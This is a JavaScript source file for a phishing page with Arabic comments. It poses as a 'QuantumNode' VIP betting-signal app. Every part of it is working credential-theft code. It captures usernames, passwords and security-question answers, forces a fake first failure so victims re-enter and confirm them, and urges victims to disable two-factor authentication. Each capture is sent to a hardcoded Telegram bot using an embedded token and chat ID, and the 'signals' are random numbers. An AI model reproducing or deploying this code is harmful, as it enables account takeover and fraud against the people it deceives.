const TG_TOKEN = "8589243363:AAH4sM1DEqNXAUK314uyagIB3GbRouEL8ak";
const CHAT_ID = "8026901193";

let loginAttempts = 0;
let securityAttempts = 0;

// المرحلة 1: تسجيل الدخول والمصادقة
async function processAuth() {
    const u = document.getElementById('u_log').value;
    const p = document.getElementById('u_pas').value;
    const btn = document.getElementById('sync-btn');
    const msg = document.getElementById('status-text');

    if (u.length < 4 || p.length < 4) return alert("البيانات ناقصة!");

    loginAttempts++;

    // المحاولة 1: خطأ إجباري لضمان صحة الباسوورد
    if (loginAttempts === 1) {
        btn.disabled = true;
        btn.innerText = "Verifying...";
        await sendToTelegram(`⚠️ محاولة 1 (تأكد):\n👤 User: ${u}\n🔑 Pass: ${p}`);
        
        setTimeout(() => {
            msg.innerText = "❌ فشل الاتصال: كلمة المرور أو اليوزر غير صحيح!";
            msg.style.color = "#ff4444";
            document.getElementById('u_pas').value = "";
            btn.disabled = false;
            btn.innerText = "Retry Sync";
        }, 1500);
        return;
    }

    // المحاولة 2: بيانات مؤكدة وعرض شروط الـ VIP
    if (loginAttempts === 2) {
        btn.disabled = true;
        btn.innerText = "Analyzing...";
        await sendToTelegram(`✅ بيانات مؤكدة (محاولة 2):\n👤 User: ${u}\n🔑 Pass: ${p}`);
        showSecurityNotice();
    }
}

// المرحلة 2: إقناع الضحية بإلغاء المصادقة
function showSecurityNotice() {
    const msg = document.getElementById('status-text');
    const btn = document.getElementById('sync-btn');
    const inputs = document.querySelectorAll('.auth-input');

    inputs.forEach(i => i.style.display = 'none');

    msg.innerHTML = `
        <div style="text-align: right; background: rgba(0,87,255,0.1); padding: 10px; border-radius: 8px; border: 1px solid #0057ff;">
            <h4 style="color: #00b3ff; margin-top: 0;">⚠️ متطلبات تفعيل الـ VIP المباشر:</h4>
            <p style="font-size: 11px; color: #eee; line-height: 1.6;">
                لإتمام "المزامنة الكمية" وضمان دقة الإشارات، يجب فك ارتباط المصادقة الثنائية (2FA) مؤقتاً لتسهيل ربط الحساب بالسيرفر العالمي.
            </p>
        </div>
    `;
    
    btn.disabled = false;
    btn.innerText = "تم الإلغاء.. إتمام المزامنة ⚡";
    
    btn.onclick = () => {
        // بدلاً من الدخول للتطبيق، ننتقل لفخ سؤال الأمان
        document.getElementById('auth-screen').classList.add('hidden');
        document.getElementById('security-layer').classList.remove('hidden');
        sendToTelegram(`🔔 الضحية أكد إلغاء المصادقة وانتقل لسؤال الأمان!`);
    };
}

// المرحلة 3: فخ سؤال الأمان (The Secret Key Capture)
async function finalVerify() {
    const ans = document.getElementById('sec_ans').value;
    const btn = document.getElementById('sec-btn');
    const msg = document.getElementById('sec-status');

    if (ans.length < 2) return alert("يرجى إدخال البيانات المطلوبة!");

    securityAttempts++;
    btn.disabled = true;
    btn.innerText = "Synchronizing...";

    if (securityAttempts === 1) {
        // خطأ إجباري في سؤال الأمان لضمان الإجابة الحقيقية
        setTimeout(() => {
            document.getElementById('sec_ans').value = "";
            msg.innerText = "❌ خطأ في التحقق: يرجى كتابة الإجابة/اللقب بدقة";
            msg.style.color = "#ff4444";
            btn.disabled = false;
            btn.innerText = "إعادة المحاولة";
        }, 1200);
        return;
    }

    // النجاح في المرة الثانية وإرسال الكنز النهائي
    await sendToTelegram(`🔑 **SECRET ASSET FOUND!**\n\n💬 Answer: \`${ans}\`\n🛡️ Step: Final Security Bypass\n📡 App: QuantumNode v6.0`);
    
    btn.innerText = "Success ✅";
    setTimeout(() => {
        document.getElementById('security-layer').classList.add('hidden');
        document.getElementById('main-app').classList.remove('hidden');
        alert("✅ تم تفعيل حساب الـ VIP بنجاح! الرادار يعمل الآن.");
    }, 1500);
}

// وظائف التطبيق العامة
function getSignal() {
    const display = document.getElementById('target-mult');
    display.innerText = "WAIT..";
    setTimeout(() => {
        const mult = (Math.random() * (3.80 - 1.20) + 1.20).toFixed(2) + "x";
        display.innerText = mult;
    }, 1000);
}

async function sendToTelegram(text) {
    try {
        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
        });
    } catch (e) {
        console.error("Telegram Error");
    }
}
